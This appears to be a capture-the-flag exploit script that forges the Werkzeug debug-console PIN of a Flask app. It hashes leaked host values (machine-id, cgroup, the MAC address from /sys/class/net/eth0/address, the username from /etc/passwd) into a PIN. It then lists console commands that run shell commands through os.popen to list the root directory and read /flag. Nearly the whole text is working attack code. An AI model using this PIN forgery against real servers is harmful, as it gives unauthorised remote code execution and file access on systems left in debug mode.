"""
# py38 py310
machine id
96cec10d3d9307792745ec3b85c89620

boot_Id
Register Success
867ab5d2-4e57-4335-811b-2943c662e936

cgroup
0::....297_96be15f4cc9c.slice/docker-02503c17a4c0f87206933c55278a901329168e072e43e651b2bb803a44dfe4a1.scope
"""

import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # username，通过/etc/passwd
    'flask.app',  # modname，默认值
    'Flask',  # 默认值
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '218564230105246',  # mac十进制值 /sys/class/net/eth0/address
    '96cec10d3d9307792745ec3b85c89620docker-02503c17a4c0f87206933c55278a901329168e072e43e651b2bb803a44dfe4a1.scope'
    # 有machine-id就不会读 proc/sys/kernel了，然后cgroup是第一行 / 后面的所有值
    # machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    # 即通常为1+3 或 2+3 或 3
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

"""console
import os
os.popen('ls /').read()
os.popen('cat /flag').read()
"""